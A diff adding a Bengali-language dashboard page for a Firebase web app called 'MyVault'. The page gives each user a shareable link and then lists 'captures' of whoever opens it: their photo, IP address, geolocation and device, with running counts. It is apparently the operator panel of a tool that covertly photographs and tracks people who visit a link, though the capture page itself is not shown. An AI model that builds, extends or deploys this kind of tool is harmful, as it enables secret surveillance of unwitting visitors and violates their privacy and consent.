@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ড্যাশবোর্ড — MyVault</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Hind+Siliguri:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="dash-nav">
+  <div class="dash-brand">
+    <div class="dash-brand-mark">V</div>
+    <div class="dash-brand-info">
+      <div class="bn">MyVault</div>
+      <div class="bs">ড্যাশবোর্ড</div>
+    </div>
+  </div>
+  <div class="dash-nav-right">
+    <a href="links.html" class="btn-logout" style="text-decoration:none;">🔗 আমার লিংক</a>
+    <div class="dash-user">
+      <div class="dash-user-av" id="userAv">U</div>
+      <span class="dash-user-name" id="userName">...</span>
+    </div>
+    <button class="btn-logout" id="btnLogout">লগআউট</button>
+  </div>
+</nav>
+
+<div class="dash-wrap">
+
+  <div class="dash-hero">
+    <h1 id="welcome">স্বাগতম 👋</h1>
+    <p>আপনার লিংকে যে কেউ ভিজিট করলে সব ডাটা এখানে দেখতে পাবেন।</p>
+  </div>
+
+  <!-- QUICK LINK -->
+  <div class="dash-section" style="background:linear-gradient(135deg,#eef2ff,#f5f3ff);border-color:#c7d2fe;">
+    <div style="display:flex;justify-content:space-between;align-items:center;gap:20px;flex-wrap:wrap;">
+      <div>
+        <div style="font-size:12px;font-weight:700;letter-spacing:0.15em;color:var(--brand);text-transform:uppercase;margin-bottom:8px;">আপনার ইউনিক লিংক</div>
+        <div id="myLink" style="font-family:var(--mono);font-size:14px;font-weight:600;color:var(--ink-2);word-break:break-all;">লোড হচ্ছে…</div>
+      </div>
+      <button class="btn-primary" style="width:auto;padding:12px 24px;" id="btnCopy">📋 কপি করুন</button>
+    </div>
+  </div>
+
+  <!-- STATS -->
+  <div class="dash-stats">
+    <div class="stat-card">
+      <div class="ico">📸</div>
+      <div class="num" id="statTotal">0</div>
+      <div class="lbl">মোট ক্যাপচার</div>
+    </div>
+    <div class="stat-card">
+      <div class="ico">📅</div>
+      <div class="num" id="statToday">0</div>
+      <div class="lbl">আজকের</div>
+    </div>
+    <div class="stat-card">
+      <div class="ico">🌐</div>
+      <div class="num" id="statCountries">0</div>
+      <div class="lbl">আলাদা IP</div>
+    </div>
+    <div class="stat-card">
+      <div class="ico">📱</div>
+      <div class="num" id="statDevices">0</div>
+      <div class="lbl">ডিভাইস</div>
+    </div>
+  </div>
+
+  <!-- CAPTURES LIST -->
+  <div class="dash-section">
+    <div class="section-head">
+      <h3>ক্যাপচার হওয়া ডাটা</h3>
+      <span class="count" id="countLabel">0 টি</span>
+    </div>
+    <div id="captureList">
+      <div class="loading"><div class="spinner"></div><span>লোড হচ্ছে…</span></div>
+    </div>
+  </div>
+
+</div>
+
+<script type="module">
+import { auth, db, onAuthStateChanged, signOut,
+         collection, query, where, onSnapshot, getDoc, doc, orderBy } from "./firebase.js";
+
+const userAv      = document.getElementById("userAv");
+const userName    = document.getElementById("userName");
+const welcome     = document.getElementById("welcome");
+const myLink      = document.getElementById("myLink");
+const btnCopy     = document.getElementById("btnCopy");
+const captureList = document.getElementById("captureList");
+const countLabel  = document.getElementById("countLabel");
+const statTotal   = document.getElementById("statTotal");
+const statToday   = document.getElementById("statToday");
+const statCountries = document.getElementById("statCountries");
+const statDevices = document.getElementById("statDevices");
+const btnLogout   = document.getElementById("btnLogout");
+
+let unsubscribe = null;
+let currentUid  = null;
+
+onAuthStateChanged(auth, async (user) => {
+  if (!user) return location.href = "login.html";
+
+  currentUid = user.uid;
+
+  const snap = await getDoc(doc(db, "users", user.uid));
+  const profile = snap.exists() ? snap.data() : {};
+  const name = profile.fullName || user.displayName || "ইউজার";
+  const initials = name.split(" ").map(n=>n[0]).join("").substring(0,2).toUpperCase();
+
+  userAv.textContent   = initials;
+  userName.textContent = name;
+  welcome.textContent  = "স্বাগতম, " + name + " 👋";
+
+  /* Generate the unique link */
+  const base = location.origin + location.pathname.replace("dashboard.html", "form.html");
+  const link = base + "?id=" + user.uid;
+  myLink.textContent = link;
+  myLink.dataset.link = link;
+
+  loadCaptures(user.uid);
+});
+
+/* Copy link */
+btnCopy.addEventListener("click", () => {
+  const link = myLink.dataset.link;
+  if (!link) return;
+  navigator.clipboard.writeText(link).then(() => {
+    btnCopy.textContent = "✓ কপি হয়েছে";
+    setTimeout(() => btnCopy.textContent = "📋 কপি করুন", 1500);
+  });
+});
+
+/* Load captures */
+function loadCaptures(uid){
+  if (unsubscribe) unsubscribe();
+
+  const q = query(
+    collection(db, "captures"),
+    where("ownerUid", "==", uid)
+  );
+
+  unsubscribe = onSnapshot(q, (snap) => {
+    const items = [];
+    snap.forEach(d => items.push({ id: d.id, ...d.data() }));
+
+    /* sort newest */
+    items.sort((a,b) => (b.createdAt?.seconds || 0) - (a.createdAt?.seconds || 0));
+
+    renderStats(items);
+    renderList(items);
+  });
+}
+
+function renderStats(items){
+  statTotal.textContent = items.length;
+
+  const today = new Date();
+  today.setHours(0,0,0,0);
+
+  const todayCount = items.filter(i => {
+    const d = i.createdAt?.toDate ? i.createdAt.toDate() : null;
+    return d && d >= today;
+  }).length;
+
+  const ips = new Set(items.map(i => i.ip).filter(Boolean));
+  const uas = new Set(items.map(i => i.userAgent).filter(Boolean));
+
+  statToday.textContent     = todayCount;
+  statCountries.textContent = ips.size;
+  statDevices.textContent   = uas.size;
+  countLabel.textContent    = items.length + " টি";
+}
+
+function renderList(items){
+  if (items.length === 0){
+    captureList.innerHTML = `
+      <div class="empty">
+        <div class="ico">📭</div>
+        <p>এখনো কোনো ডাটা আসেনি।<br>আপনার লিংক শেয়ার করুন।</p>
+      </div>`;
+    return;
+  }
+
+  let html = "";
+  items.forEach(item => {
+    const date = item.createdAt?.toDate
+      ? item.createdAt.toDate().toLocaleString("bn-BD")
+      : "—";
+
+    const photo = item.photoUrl
+      ? `<img src="${item.photoUrl}" alt="">`
+      : "📷";
+
+    html += `
+      <div class="data-item" onclick="location.href='viewer.html?id=${item.id}'" style="cursor:pointer;">
+        <div class="thumb">${photo}</div>
+        <div class="info">
+          <h4>ক্যাপচার #${item.id.substring(0,6)}</h4>
+          <p>🌐 IP: ${escape(item.ip || "—")} · ${escape(item.geo || "")}</p>
+          <p style="font-size:12px;">🕐 ${date}</p>
+        </div>
+        <div style="align-self:center;color:var(--muted);font-size:20px;">→</div>
+      </div>`;
+  });
+  captureList.innerHTML = html;
+}
+
+function escape(s){
+  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+}
+
+btnLogout.addEventListener("click", async () => {
+  if (unsubscribe) unsubscribe();
+  await signOut(auth);
+  location.href = "login.html";
+});
+</script>
+
+</body>
+</html>
